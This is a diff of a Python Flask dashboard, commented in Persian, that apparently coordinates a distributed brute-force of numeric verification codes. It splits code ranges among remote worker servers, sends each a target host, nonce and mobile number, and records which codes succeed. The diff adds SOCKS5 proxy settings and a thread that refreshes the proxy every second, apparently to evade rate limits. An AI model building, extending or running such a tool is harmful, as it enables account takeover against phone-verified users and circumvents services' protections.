@@ -2,6 +2,7 @@ import requests
 from flask import Flask, render_template_string, request, jsonify
 from flask_socketio import SocketIO, emit
 import threading
+import time
 
 app = Flask(__name__)
 socketio = SocketIO(app)
@@ -20,7 +21,7 @@ REMOTE_SERVERS = [
 ]
 
 RANGES = [
-    (00000, 10000),
+    (0, 10000),
     (10000, 20000),
     (20000, 30000),
     (30000, 40000),
@@ -34,14 +35,42 @@ RANGES = [
 
 progress_log = []
 found_success = False
-success_codes = []  # برای ذخیره موفقیت‌ها
+success_codes = []
+proxy_setting = ""  # متغیر گلوبال برای پروکسی
+
+# تابع فرضی برای گرفتن پروکسی از مرکزی
+def get_proxy_from_central():
+    # اینجا باید منطق واقعی پروکسی مرکزی رو بذاری (مثلاً API)
+    return "socks5://new_user:new_pass@new_host:new_port"
+
+# آپدیت خودکار پروکسی هر ثانیه (فقط وقتی دستی تنظیم نشده)
+def update_proxy_from_central():
+    global proxy_setting
+    while True:
+        if not proxy_setting:  # اگه پروکسی دستی تنظیم نشده باشه
+            new_proxy = get_proxy_from_central()
+            proxy_setting = new_proxy
+            progress_log.append(f"Updated proxy from central: {new_proxy}")
+            socketio.emit('update_progress', {'log': progress_log[-1]})
+        time.sleep(1)
+
+# شروع آپدیت پروکسی در پس‌زمینه
+threading.Thread(target=update_proxy_from_central, daemon=True).start()
 
 def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
     """ارسال درخواست به سرور ریموت"""
     try:
         response = requests.post(
             f"{server_url}/start",
-            json={"host": host, "nonce": nonce, "mobile": mobile, "connections": connections, "startRange": start_range, "endRange": end_range},
+            json={
+                "host": host,
+                "nonce": nonce,
+                "mobile": mobile,
+                "connections": connections,
+                "startRange": start_range,
+                "endRange": end_range,
+                "proxy": proxy_setting  # ارسال پروکسی به ورکر
+            },
             timeout=10
         )
         response.raise_for_status()
@@ -63,7 +92,7 @@ def stop_all_servers():
             socketio.emit('update_progress', {'log': progress_log[-1]})
 
 def get_worker_status():
-    """جمع‌آوری وضعیت ورکرها با درخواست پایتونی"""
+    """جمع‌آوری وضعیت ورکرها"""
     global success_codes
     status_data = {}
     for server in REMOTE_SERVERS:
@@ -141,6 +170,10 @@ def index():
                         <input type="number" id="connections" class="mt-1 block w-full p-3 border rounded-lg" value="20">
                     </div>
                     <div>
+                        <label class="block text-sm font-medium text-gray-700">پروکسی (SOCKS5):</label>
+                        <input type="text" id="proxy" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: socks5://user:pass@host:port">
+                    </div>
+                    <div>
                         <label class="block text-sm font-medium text-gray-700">نوع اسکن:</label>
                         <div class="mt-2">
                             <label class="inline-flex items-center">
@@ -181,7 +214,6 @@ def index():
                             </tr>
                         </thead>
                         <tbody id="table-body">
-                            <!-- جدول با AJAX پر می‌شه -->
                         </tbody>
                     </table>
                 </div>
@@ -196,7 +228,6 @@ def index():
                             </tr>
                         </thead>
                         <tbody id="success-body">
-                            <!-- جدول موفقیت‌ها با AJAX پر می‌شه -->
                         </tbody>
                     </table>
                 </div>
@@ -263,26 +294,15 @@ def index():
                                     successBody.appendChild(row);
                                 });
                             });
-                    })
-                    .catch(error => {
-                        console.error('Error fetching status:', error);
-                        tableBody.innerHTML = '<tr><td colspan="5">خطا در دریافت وضعیت</td></tr>';
-                        successBody.innerHTML = '<tr><td colspan="3">خطا در دریافت موفقیت‌ها</td></tr>';
                     });
             }
 
             setInterval(updateTables, 5000);
             updateTables();
 
-            socket.on('connect', () => {
-                console.log('Connected to WebSocket');
-            });
+            socket.on('connect', () => console.log('Connected to WebSocket'));
+            socket.on('update_progress', function(data) { console.log('Log:', data.log); });
 
-            socket.on('update_progress', function(data) {
-                console.log('Log:', data.log);
-            });
-
-            // نمایش/مخفی کردن فیلدهای رنج سفارشی
             document.querySelectorAll('input[name="scan_type"]').forEach(radio => {
                 radio.addEventListener('change', () => {
                     const customRangeDiv = document.getElementById('custom_range');
@@ -295,6 +315,7 @@ def index():
                 const nonce = document.getElementById('nonce').value;
                 const mobile = document.getElementById('mobile').value;
                 const connections = document.getElementById('connections').value;
+                const proxy = document.getElementById('proxy').value;
                 const scanType = document.querySelector('input[name="scan_type"]:checked').value;
                 let startRange = null;
                 let endRange = null;
@@ -311,15 +332,19 @@ def index():
                 fetch('/start', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ host, nonce, mobile, connections, scan_type: scanType, start_range: startRange, end_range: endRange })
+                    body: JSON.stringify({ host, nonce, mobile, connections, scan_type: scanType, start_range: startRange, end_range: endRange, proxy })
                 }).then(response => {
                     if (response.ok) {
                         startBtn.disabled = true;
                         stopBtn.disabled = false;
-                    } else {
-                        console.error('Start failed:', response.status);
                     }
-                }).catch(error => console.error('Fetch error:', error));
+                });
+
+                fetch('/set_proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ proxy })
+                });
             });
 
             stopBtn.addEventListener('click', () => {
@@ -343,24 +368,23 @@ def start():
     nonce = data['nonce']
     mobile = data['mobile']
     connections = int(data['connections'])
-    scan_type = data.get('scan_type', 'full')  # پیش‌فرض اسکن کامل
+    scan_type = data.get('scan_type', 'full')
     start_range = data.get('start_range')
     end_range = data.get('end_range')
 
     found_success = False
     progress_log = []
-    success_codes = []  # ریست موفقیت‌ها
+    success_codes = []
     progress_log.append("Starting distribution to remote servers...")
     socketio.emit('update_progress', {'log': progress_log[-1]})
 
-    # تعیین رنج‌ها
     if scan_type == 'full':
-        ranges = RANGES  # استفاده از رنج پیش‌فرض
-    else:  # scan_type == 'custom'
+        ranges = RANGES
+    else:
         start_range = int(start_range)
         end_range = int(end_range)
         total_range = end_range - start_range
-        chunk_size = total_range // len(REMOTE_SERVERS)  # تقسیم رنج بین سرورها
+        chunk_size = total_range // len(REMOTE_SERVERS)
         ranges = []
         for i in range(len(REMOTE_SERVERS)):
             chunk_start = start_range + (i * chunk_size)
@@ -385,14 +409,21 @@ def stop():
     stop_all_servers()
     return '', 204
 
+@app.route('/set_proxy', methods=['POST'])
+def set_proxy():
+    global proxy_setting
+    data = request.get_json()
+    proxy_setting = data.get('proxy', '')
+    progress_log.append(f"Proxy set to: {proxy_setting}")
+    socketio.emit('update_progress', {'log': progress_log[-1]})
+    return '', 204
+
 @app.route('/get_status', methods=['GET'])
 def get_status():
-    """برگشت وضعیت ورکرها به صورت JSON"""
     return jsonify(get_worker_status())
 
 @app.route('/get_success', methods=['GET'])
 def get_success():
-    """برگشت موفقیت‌ها به صورت JSON"""
     global success_codes
     return jsonify(success_codes)
 
